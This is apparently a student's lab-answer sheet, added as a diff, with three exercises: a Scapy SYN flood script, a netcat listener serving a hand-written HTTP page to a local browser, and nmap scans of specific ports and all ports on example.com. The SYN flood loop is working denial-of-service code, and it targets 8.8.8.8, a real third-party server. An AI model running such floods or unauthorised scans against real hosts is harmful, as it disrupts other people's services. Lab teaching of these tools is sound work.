@@ -1,0 +1,39 @@
+9]
+a. Demonstrate SYN flood attack using Scapy.
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+     
+from scapy.all import *
+target_ip = "8.8.8.8"
+target_port = 443
+
+for i in range(1000):
+    send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), verbose=False) //code is crct but o/p wont come since many devices r needed
+
+-----
+b.Using NetCat, show communication between browser and the server. (for an image)
+Ans:Go to seed vm ,open termial and type:
+  nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+<img src="image address"> // (do copy image location:its not possible in our systems..in lab it will work)
+
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer and image
+
+-----    
+c.Using Nmap, Scan specific ports. Also show how to scan all 65535 ports.
+Ans:Open Nmap or Zenmap,
+ Under cmd field type:
+     nmap -p 80,443 example.com
+ Also to scan all ports, under cmd field type:
+     nmap -p - example.com
+
